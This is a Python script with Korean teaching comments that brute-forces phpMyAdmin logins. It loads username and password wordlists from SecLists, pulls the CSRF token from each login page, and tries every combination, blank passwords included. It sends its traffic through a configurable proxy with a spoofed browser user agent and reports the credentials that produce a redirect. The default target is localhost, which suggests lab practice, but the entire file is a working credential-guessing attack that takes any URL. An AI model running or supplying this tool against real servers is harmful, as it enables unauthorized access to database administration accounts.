TARGET_URL = "http://127.0.0.1:8080/phpmyadmin/index.php"
USER_WORDLIST = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
PASS_WORDLIST = "/usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt"
PROXY = "http://192.168.182.189:3128"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
REQUEST_TIMEOUT_SEC = 10

# 커맨드라인 인자 읽기
import sys

# HTTP GET/POST, 세션, 쿠키, 프록시 설정 등
import requests


def load_wordlist(path):
    """워드리드스 파일 로드.
    Args:
        path: 파일 경로
    Returns:
        None
    """
    try:
        # with는 본질적으로 try/finally를 더 깔끔하게 쓰는 축약
        # __enter__: 블록 진입 시 실행 (자원 열기, 값 반환)
        # __exit__: 블록 종료 시 실행 (자원 정리, 예외 처리) -> 이걸 호출해 줌
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            # result = []
            # for line in f:
            #    if line.strip():
            #        result.append(line.strip())
            # return result
            return [line.strip() for line in f if line.strip()]

    # FileNotFoundError -> 파일 없는 에러만 잡음
    # except Exception as e -> 모든 에러 잡음 -> e 에러 객체
    except FileNotFoundError:
        print(f"not found file : {path}")
        return None


def brute_force(url, users, passwords, proxy):
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    # proxies = {
    #     "http": "http://10.10.1.10:1080",
    #     "https": "http://10.10.1.10:1080",
    # }
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    total = len(users) * (len(passwords) + 1)  # +1 -> 빈 비밀번호 포함

    print(f"[*] target: {url}")
    print(f"[*] users: {len(users)} | passwords: {len(passwords)} | total: {total}")
    print(f"[*] proxy: {proxy if proxy else ('none')}")

    count = 0

    for user in users:
        # 빈 문자열 + 교차 탐색
        for pw in [""] + passwords:
            count += 1
            try:
                # 1. GET: 세션 쿠키, CSRF 토큰 획득 -> 일반적으로 get으로 발급 후 post하는 구조
                request_get = session.get(
                    url=url, proxies=proxies, timeout=REQUEST_TIMEOUT_SEC
                )

                # <input type="hidden" name="token" value="d41d8cd98f00b204e9800998ecf8427e" /> -> 여기서 추출
                # 이 부분은 해당 사이트마다 달라짐
                token = (
                    request_get.text.split('name="token"')[1]
                    .split('value="')[1]
                    .split('"')[0]
                )

                # 2. 바디 -> 획득한 토큰과 함께 로그인 요청을 위해 셋팅
                data = {
                    "pma_username": user,
                    "pma_password": pw,
                    "token": token,
                    "server": "1",
                }

                # 3. POST
                request_post = session.post(
                    url,
                    data=data,
                    proxies=proxies,
                    allow_redirects=False,
                    timeout=REQUEST_TIMEOUT_SEC,
                )
                # 빈 비밀번호 처리
                display_pw = "(빈 비밀번호)" if pw == "" else pw

                if request_post.status_code in range(300, 400):
                    print(f"[+] 성공! user: {user}, password: {display_pw}")
                    return True

                print(
                    f"[-] {count}/{total} -> failed user: {user}, password: {display_pw}"
                )

            except (
                requests.RequestException,
                ValueError,
                IndexError,
                AttributeError,
                OSError,
            ) as e:
                print(f"[!] Error user: {user}, password: {pw}, error: {e}")
                # 에러 시 세션 안전하게 리셋 -> 실패를 사유로 서버측에서 어떠한 상태 변화를 줄 수 있으므로
                session = requests.Session()
                # 에러 시 에이전트 리셋
                session.headers.update({"User-Agent": USER_AGENT})

    print("not found")
    return False


if __name__ == "__main__":
    # sys.argv[0] -> 자기 자신 파일 경로
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    users_path = sys.argv[2] if len(sys.argv) > 2 else USER_WORDLIST
    passwords_path = sys.argv[3] if len(sys.argv) > 3 else PASS_WORDLIST
    proxy = sys.argv[4] if len(sys.argv) > 4 else PROXY

    users = load_wordlist(users_path)
    passwords = load_wordlist(passwords_path)

    if users is None or passwords is None:
        sys.exit(1)

    brute_force(url, users, passwords, proxy)
